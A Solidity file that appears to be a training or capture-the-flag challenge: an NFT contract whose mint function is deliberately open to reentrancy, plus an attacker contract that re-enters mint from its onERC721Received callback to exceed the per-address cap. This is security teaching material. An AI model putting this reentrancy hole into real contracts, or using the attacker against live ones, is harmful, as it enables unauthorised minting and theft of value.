// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.25;
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Overmint1 is ERC721 {
    using Address for address;
    mapping(address => uint256) public amountMinted;
    uint256 public totalSupply;

    constructor() ERC721("Overmint1", "AT") {}

    function mint() external {
        require(amountMinted[msg.sender] <= 3, "max 3 NFTs");
        totalSupply++;
        _safeMint(msg.sender, totalSupply);
        amountMinted[msg.sender]++;
    }

    function success(address _attacker) external view returns (bool) {
        return balanceOf(_attacker) == 5;
    }
}

contract Overmint1Attacker is IERC721Receiver {
    Overmint1 public overmint1;
    uint256 private mintCount;

    constructor(address _overmint1Address) {
        overmint1 = Overmint1(_overmint1Address);
    }

    function attack() external {
        overmint1.mint();
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        if (mintCount < 4) {
            mintCount++;
            overmint1.mint();
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}